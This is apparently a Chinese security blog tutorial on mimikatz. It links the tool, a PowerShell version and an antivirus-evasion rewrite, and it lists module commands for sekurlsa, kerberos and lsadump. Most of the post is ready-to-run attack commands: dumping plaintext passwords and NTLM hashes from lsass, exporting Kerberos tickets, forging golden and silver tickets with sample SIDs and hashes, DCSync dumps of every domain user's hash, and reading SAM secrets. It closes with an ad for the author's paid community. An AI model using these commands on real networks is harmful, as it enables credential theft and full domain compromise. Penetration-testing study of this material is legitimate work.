**目录**

[mimikatz](#t0 "mimikatz")

[mimikatz的使用](#t1 "mimikatz的使用")

[sekurlsa模块](#t2 "sekurlsa模块")

[kerberos模块](#t3 "kerberos模块")

[lsadump模块](#t4 "lsadump模块 ") 

* * *

mimikatz
--------

mimikatz是法国人Gentil Kiwi 编写的一款 Windows 平台下的神器，它具备很多功能，其中最主要的功能是直接从 lsass.exe 进程里获取处于active状态的账号明文密码。mimikatz的功能不仅如此，它还可以提升进程权限，注入进程，读取进程[内存](https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020)等等，mimikatz包含了很多本地模块，更像是一个轻量级的调试器。作者主页：[http://blog.gentilkiwi.com/](http://blog.gentilkiwi.com/%C2%A0 "http://blog.gentilkiwi.com/ ")   项目地址：[GitHub - gentilkiwi/mimikatz: A little tool to play with Windows security](https://github.com/gentilkiwi/mimikatz/ "GitHub - gentilkiwi/mimikatz: A little tool to play with Windows security")  。mimikatz的Powershell版本：[Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1 "Invoke-Mimikatz.ps1")**(**[GitHub - fir3d0g/mimidogz: Rewrite of Invoke-Mimikatz.ps1 to avoid AV detection](https://github.com/fir3d0g/mimidogz "GitHub - fir3d0g/mimidogz: Rewrite of Invoke-Mimikatz.ps1 to avoid AV detection")**)**

mimikatz的使用
-----------

**查看mimikatz的版本**

![](https://img-blog.csdnimg.cn/2020021823201556.png)

**查看mimikatz中的模块**

随便输入 xx:: ，会提示xx模块没发现，然后就会列出所有可用的模块命令

```
cls：清屏      
standard：标准模块，基本命令      
crypto：加密相关模块      
sekurlsa：与证书相关的模块      
kerberos：kerberos模块      
privilege：提权相关模块      
process：进程相关模块      
serivce：服务相关模块      
lsadump：LsaDump模块      1
ts：终端服务器模块      1
event：事件模块      1
misc：杂项模块      1
token：令牌操作模块      1
vault：Windows 、证书模块      1
minesweeper：Mine Sweeper模块      1
net：      1
dpapi：DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]      1
busylight：BusyLight Module      1
sysenv：系统环境值模块      2
sid：安全标识符模块      2
iis：IIS XML配置模块      2
rpc：mimikatz的RPC控制      2
sr98：用于SR98设备和T5577目标的RF模块      2
rdm：RDM（830AL）器件的射频模块      2
acr：ACR模块      2
version：查看版本      2
exit：退出
```


![](https://img-blog.csdnimg.cn/20200218232050156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**查看模块的参数**

如果要查看某个模块具体的参数，也是一样用法。比如我要查看kerberos模块有哪些参数，可以 kerberos:: ，这样就会列出该模块具体有哪些参数了。

![](https://img-blog.csdnimg.cn/2020031109403440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

mimikatz 很多功能的使用需要管理员权限，也就是需要本地的 administrator 权限或者域内的管理员组内权限。如果是工作组环境，则必须得是 administrator 用户，而不能是管理员组内的用户。如果是域环境，则只要是域管理员组内用户即可。

```
privilege::debug             #提升权限
```


### sekurlsa模块

```
抓取系统明文密码      
sekurlsa::logonpasswords       
抓取用户NTLM哈希      
sekurlsa::msv       
加载dmp文件，并导出其中的明文密码      
sekurlsa::minidump lsass.dmp      
sekurlsa::logonpasswords full       1
导出lsass.exe进程中所有的票据      1
sekurlsa::tickets /export
```


### kerberos模块

```
列出系统中的票据      
kerberos::list      
kerberos::tgt       
清除系统中的票据      
kerberos::purge       
导入票据到系统中      
kerberos::ptc 票据路径       1
生成黄金票据并导入，利用krbtgt的NTLM哈希      1
kerberos::golden /user:administrator /domain:xie.com /sid:S-1-5-21-2189311154-2766837956-1982445477 /krbtgt:7aad81625fab43e7fdb3cd9f399c060c /ptt      1
kerberos::golden /user:要伪造的域用户(我们这一般写域管理员) /domain:域名 /sid:域的sid值 /krbtgt:krbtgt的哈希 /ptt      1
生成黄金票据并导入，利用krbtgt的AES-256      1
kerberos::golden /user:administrator /domain:xie.com /sid:S-1-5-21-2189311154-2766837956-1982445477 /aes256:93c335cce03858c917fa2ea98ca79f0b791c93c33ab17936784548114648cda7  /ptt      1
kerberos::golden /user:要伪造的域用户(我们这一般写域管理员) /domain:域名 /sid:域的sid值 /aes256:krbtgt的AES256 /ptt       1
生成白银票据并导入      1
kerberos::golden /domain:xie.com /sid:S-1-5-21-2189311154-2766837956-1982445477 /target:WIN2008.xie.com /service:cifs /rc4:290c699798b47b809500b3bbd4ed3e2f /user:administrator /ptt
```


### lsadump模块 

```
(在域控上执行)查看域xie.com内指定用户krbtgt的详细信息，包括NTLM哈希等      
lsadump::dcsync /domain:xie.com /user:krbtgt       
(在域控上执行)读取指定域所有用户的哈希      
lsadump::dcsync /domain:beijing.xie.com  /all /csv        
(在域控上执行)读取所有域用户的哈希      
lsadump::lsa /patch       1
从sam.hive和system.hive文件中获得NTLM Hash      1
lsadump::sam /sam:sam.hive /system:system.hive       1
从本地SAM文件中读取密码哈希      1
token::elevate      1
lsadump::sam
```


![](https://img-blog.csdnimg.cn/20210627111830160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210627111915907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

查看所有的密码

```
mimikatz.exe privilege::debug log "token::elevate lsadump::sam lsadump::secrets" exit
```


![](https://img-blog.csdnimg.cn/20200721111755513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用mimikatz进行票据传递攻击(PtT)：[票据传递攻击(Pass the Ticket,PtT)](https://blog.csdn.net/qq_36119192/article/details/92843080 "票据传递攻击(Pass the Ticket,PtT)")

mimikatz更多用法后续更新。。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)